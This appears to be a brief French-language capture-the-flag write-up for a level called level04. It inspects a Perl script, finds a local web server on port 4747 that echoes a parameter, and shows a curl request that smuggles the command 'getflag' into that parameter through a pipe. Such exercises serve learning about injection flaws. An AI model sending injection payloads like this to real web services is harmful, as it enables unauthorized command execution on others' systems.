```
cat level04.pl
```

En lisant le script i l semblerait qu'il y ait un server qui ecoute dans localhost:4747
on peut essayer de faire un get avec `curl`

```
curl localhost:4747/?x='hello'
```
Ca retourne le parametre x. On voit dans le script qu'il s'agit d'un echo mais a travers l'argument x on peut injecter une commande:

```
curl localhost:4747/?x='|getflag'
```
